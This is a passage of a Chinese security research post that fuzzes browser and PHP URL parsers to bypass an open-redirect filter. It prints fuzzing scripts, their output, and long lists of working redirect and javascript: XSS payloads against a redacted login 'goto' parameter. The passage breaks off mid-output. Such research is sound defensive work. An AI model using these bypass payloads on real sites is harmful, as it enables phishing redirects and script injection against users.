+10:  URL encoded i : %0A debugger eval code:7:13-&gt; http:%0a//localhost
+13:  URL encoded i : %0D debugger eval code:7:13-&gt; http:%0d//localhost
+47:  URL encoded i : / debugger eval code:7:13 -&gt; http:///localhost
+92:  URL encoded i : %5C \ -&gt; http:\//localhost
+</code></pre><p>那么PHP的URL解析器是如何解析的呢？</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="p">[</span><span class="s2">&#34;http:%09//localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;%09//localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:   //localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;   //localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:%0a//localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;%0a//localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:\//localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="s2">&#34;\//localhost&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http:///localhost&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">bool</span><span class="p">(</span><span class="k">false</span><span class="p">)</span>
+</span></span></code></pre></div><p>由此可见，PHP URL解析器面对这些payload的时候，要么会认为<code>http:</code>之后的都是path部分，要么直接认为该URL是一个非法的URL，从而返回了false</p>
+<p>换句话说，以下payload 也可以绕过redacted 的filter ，导致开放重定向:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http:\//www.baidu.com
+https://demo.redacted.com/login?goto=http:%0d\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%0a\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%09\\www.baidu.com
+</code></pre>
+
+<h3 class="relative group">http{char}://localhost:80/xxxx 
+    <div id="httpcharlocalhost80xxxx-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#httpcharlocalhost80xxxx-1" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<p>我们能否在 <code>http</code> 和 <code>://</code>之间找到一个字符，加入该字符后仍然可以让前端URL解析器认为URL的host部分是localhost且scheme部分是http呢?</p>
+<p>fuzzer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;://localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">url</span><span class="p">[</span><span class="s1">&#39;protocol&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http:&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;i: &#39;</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="s1">&#39; URL encoded i : &#39;</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span></code></pre></div><p>前端URL解析器的运行结果:</p>
+<pre tabindex="0"><code>VM437:7 9:  URL encoded i : %09
+VM437:7 10:  URL encoded i : %0A
+VM437:7 13:  URL encoded i : %0D
+</code></pre><p>这次只得到了三个字符，没有了 / 和 \   ，得到如下3个payload</p>
+<pre tabindex="0"><code>http%09://baidu.com
+http%0a://baidu.com
+http%0d://baidu.com 
+</code></pre><p>PHP的URL解析器是如何解析的呢?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http%09://localhost:80/xxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="s2">&#34;http%09://localhost:80/xxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http%0a://localhost:80/xxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="s2">&#34;http%0a://localhost:80/xxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;http%0d://localhost:80/xxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="s2">&#34;http%0d://localhost:80/xxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>PHP 直接认为整个URL 都是path 部分，即认为整个URL就是一个相对URL</p>
+<p>这样一来，同时绕过了filter的协议检查和host检查:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;http\n://localhost:80/xxx&#39;</span> <span class="c1">//成功！
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;javascript\n:alert(1)&#39;</span> <span class="c1">//成功!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;javascript\r:alert(1)&#39;</span> <span class="c1">//成功！
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;javascript\t:alert(1)&#39;</span> <span class="c1">//成功！
+</span></span></span></code></pre></div><p>payload:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=javascript%0d:alert(1) //成功！
+https://demo.redacted.com/login?goto=javascript%0a:alert(1) //成功！
+https://demo.redacted.com/login?goto=javascript%09:alert(1) //成功！
+https://demo.redacted.com/login?goto=http%09://baidu.com //成功
+</code></pre>
+
+<h3 class="relative group">{char}http://localhost:80/xxxx 
+    <div id="charhttplocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#charhttplocalhost80xxxx" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<p>能否在 <code>http</code>协议之前找到一个字符，填充进去后，仍然可以让前端URL解析器认为URL的host部分是localhost且scheme部分是http呢?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;http://localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">url</span><span class="p">[</span><span class="s1">&#39;protocol&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http:&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`i: </span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb"> ,URL encoded i : `</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39; string begin:&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;string end&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">i</span><span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//console.log(encodeURI(String.fromCodePoint(i))+&#39;http://localhost:80/xxxx&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;javascript:alert(1)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>生成了如下payload:</p>
+<pre tabindex="0"><code>%00http://localhost:80/xxxx
+%01http://localhost:80/xxxx
+%02http://localhost:80/xxxx
+%03http://localhost:80/xxxx
+%04http://localhost:80/xxxx
+%05http://localhost:80/xxxx
+%06http://localhost:80/xxxx
+%07http://localhost:80/xxxx
+%08http://localhost:80/xxxx
+%09http://localhost:80/xxxx
+%0Ahttp://localhost:80/xxxx
+%0Bhttp://localhost:80/xxxx
+%0Chttp://localhost:80/xxxx
+%0Dhttp://localhost:80/xxxx
+%0Ehttp://localhost:80/xxxx
+%0Fhttp://localhost:80/xxxx
+%10http://localhost:80/xxxx
+%11http://localhost:80/xxxx
+%12http://localhost:80/xxxx
+%13http://localhost:80/xxxx
+%14http://localhost:80/xxxx
+%15http://localhost:80/xxxx
+%16http://localhost:80/xxxx
+%17http://localhost:80/xxxx
+%18http://localhost:80/xxxx
+%19http://localhost:80/xxxx
+%1Ahttp://localhost:80/xxxx
+%1Bhttp://localhost:80/xxxx
+%1Chttp://localhost:80/xxxx
+%1Dhttp://localhost:80/xxxx
+%1Ehttp://localhost:80/xxxx
+%1Fhttp://localhost:80/xxxx
+%20http://localhost:80/xxxx
+</code></pre><p>将http协议替换为javascript协议:</p>
+<pre tabindex="0"><code>%00javascript:alert(1)
+%01javascript:alert(1)
+%02javascript:alert(1)
+%03javascript:alert(1)
+%04javascript:alert(1)
+%05javascript:alert(1)
+%06javascript:alert(1)
+%07javascript:alert(1)
+%08javascript:alert(1)
+%09javascript:alert(1)
+%0Ajavascript:alert(1)
+%0Bjavascript:alert(1)
+%0Cjavascript:alert(1)
+%0Djavascript:alert(1)
+%0Ejavascript:alert(1)
+%0Fjavascript:alert(1)
+%10javascript:alert(1)
+%11javascript:alert(1)
+%12javascript:alert(1)
+%13javascript:alert(1)
+%14javascript:alert(1)
+%15javascript:alert(1)
+%16javascript:alert(1)
+%17javascript:alert(1)
+%18javascript:alert(1)
+%19javascript:alert(1)
+%1Ajavascript:alert(1)
+%1Bjavascript:alert(1)
+%1Cjavascript:alert(1)
+%1Djavascript:alert(1)
+%1Ejavascript:alert(1)
+%1Fjavascript:alert(1)
+%20javascript:alert(1)
+</code></pre><p>PHP 的URL解析器是如何解析的呢？</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%00http://localhost:80/xxxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span> <span class="s2">&#34;%00http://localhost:80/xxxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%01http://localhost:80/xxxx&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span> <span class="s2">&#34;%01http://localhost:80/xxxx&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%1Djavascript:alert(1)&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span> <span class="s2">&#34;%1Djavascript:alert(1)&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s2">&#34;%1Ejavascript:alert(1)&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span> <span class="s2">&#34;%1Ejavascript:alert(1)&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>PHP 的URL解析器认为整个URL就是一个相对URL</p>
+<p>所以以下payload 都可以绕过redacted filter 的协议检查和host检查:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=%00javascript:alert(1)
+https://demo.redacted.com/login?goto=%01javascript:alert(1)
+https://demo.redacted.com/login?goto=%02javascript:alert(1)
+https://demo.redacted.com/login?goto=%03javascript:alert(1)
+https://demo.redacted.com/login?goto=%04javascript:alert(1)
+https://demo.redacted.com/login?goto=%05javascript:alert(1)
+https://demo.redacted.com/login?goto=%06javascript:alert(1)
+https://demo.redacted.com/login?goto=%07javascript:alert(1)
+https://demo.redacted.com/login?goto=%08javascript:alert(1)
+https://demo.redacted.com/login?goto=%09javascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%10javascript:alert(1)
+https://demo.redacted.com/login?goto=%11javascript:alert(1)
+https://demo.redacted.com/login?goto=%12javascript:alert(1)
+https://demo.redacted.com/login?goto=%13javascript:alert(1)
+https://demo.redacted.com/login?goto=%14javascript:alert(1)
+https://demo.redacted.com/login?goto=%15javascript:alert(1)
+https://demo.redacted.com/login?goto=%16javascript:alert(1)
+https://demo.redacted.com/login?goto=%17javascript:alert(1)
+https://demo.redacted.com/login?goto=%18javascript:alert(1)
+https://demo.redacted.com/login?goto=%19javascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%20javascript:alert(1)
+</code></pre>
+
+<h3 class="relative group">ht{char}tp://localhost:80/xxxx 
+    <div id="htchartplocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#htchartplocalhost80xxxx" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<p>让我们的想法再大胆一点，能否在<code>ht</code>和<code>tp</code>之间找到一种字符，让前端的URL解析器仍然认为URL的scheme部分是<code>http</code>且host部分是<code>localhost</code></p>
+<p>fuzz 程序如下:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;ht&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;tp://localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">url</span><span class="p">[</span><span class="s1">&#39;protocol&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http:&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;i: &#39;</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="s1">&#39; URL encoded i : &#39;</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span></code></pre></div><p>运行结果:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">i</span><span class="o">:</span> <span class="mi">9</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">i</span> <span class="o">:</span> <span class="o">%</span><span class="mi">09</span> <span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span> <span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://localhost/xxxx&#34;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://localhost&#34;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/xxxx&#34;</span><span class="p">,</span> <span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">i</span><span class="o">:</span> <span class="mi">10</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">i</span> <span class="o">:</span> <span class="o">%</span><span class="mi">0</span><span class="nx">A</span> <span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span> <span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://localhost/xxxx&#34;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://localhost&#34;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/xxxx&#34;</span><span class="p">,</span> <span class="nx">search</span><span 